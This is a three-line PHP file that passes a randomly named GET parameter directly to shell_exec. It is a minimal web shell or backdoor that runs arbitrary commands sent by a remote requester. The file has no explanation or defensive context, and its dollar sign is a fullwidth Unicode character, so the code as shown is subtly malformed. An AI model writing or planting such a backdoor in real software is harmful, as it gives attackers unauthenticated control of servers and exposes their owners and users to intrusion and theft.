<?php
shell_exec(＄_GET['I1TzWtZz']);
?>
